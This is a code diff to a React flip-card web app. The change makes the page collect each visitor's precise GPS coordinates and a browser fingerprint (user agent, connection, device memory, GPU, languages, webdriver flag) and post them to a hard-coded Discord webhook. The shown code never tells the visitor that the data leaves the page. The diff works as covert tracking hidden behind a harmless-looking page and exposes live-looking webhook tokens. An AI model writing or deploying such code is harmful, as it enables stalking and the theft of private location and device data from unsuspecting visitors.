@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import styled from "styled-components";
 import FlipCard from "./FlipCard/FlipCard";
 import { lightTheme } from "./assets/theme";
@@ -21,6 +21,7 @@ function App() {
   const [theme, setTheme] = useState(lightTheme);
   const [flip, setFlip] = useState(false);
   const [userInfo, setUserInfo] = useState({});
+  const prevUserInfo = useRef(null);
 
   useEffect(() => {
     try {
@@ -29,11 +30,28 @@ function App() {
         result.userAgent = navigator.userAgentData;
         result.connection = navigator.connection;
         result.deviceMemory = navigator.deviceMemory;
-        result.location = navigator.geolocation;
         result.gpu = navigator.gpu;
         result.languages = navigator.languages;
         result.webdriver = navigator.webdriver;
-        setUserInfo(result);
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              result.location = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+              };
+              setUserInfo(result);
+              console.log("result", result);
+            },
+            () => {
+              // Set a default location if the user denies the location permission
+              result.location = { lat: 0, lng: 0 };
+              setUserInfo(result);
+              console.log("result", result);
+            }
+          );
+        }
       }
     } catch (error) {
       console.error(error);
@@ -42,12 +60,30 @@ function App() {
 
   useEffect(() => {
     if (Object.keys(userInfo).length > 0) {
+      if (
+        prevUserInfo.current !== null &&
+        JSON.stringify(userInfo) === JSON.stringify(prevUserInfo.current)
+      ) {
+        console.log("User info hasn't changed, skipping webhook send.");
+        return;
+      }
+      prevUserInfo.current = userInfo;
+      const message = `- **User Agent:** ${JSON.stringify(userInfo.userAgent)}\n
+- **Connection:** ${JSON.stringify(navigator.connection.effectiveType)}\n
+- **Device Memory:** ${userInfo.deviceMemory}\n
+- **Location:** ${JSON.stringify(userInfo.location)}\n
+- **GPU:** ${userInfo.gpu}\n
+- **Languages:** ${userInfo.languages}\n
+- **Webdriver:** ${userInfo.webdriver}`;
+      console.log(userInfo.location);
       try {
         fetch(
-          "https://discord.com/api/webhooks/1087711238580076575/nRXnKz-p_70968oW64vb9JQfa4HMovG5BX9bvFgawz0QbNY_1bF8C9pNvgvm6qMy-spW",
+          "https://discord.com/api/webhooks/1098651016288800858/Fo4Fg6zES5Ur24KxYVnY9O0Znj4v19-QIU9DL3VhdtHfqI8gkAk8u-TNcmJYUOs2WCms",
           {
             method: "POST",
-            body: { conent: JSON.stringify(userInfo) },
+            body: JSON.stringify({
+              content: "User info: " + message,
+            }),
             headers: {
               "Content-Type": "application/json",
             },
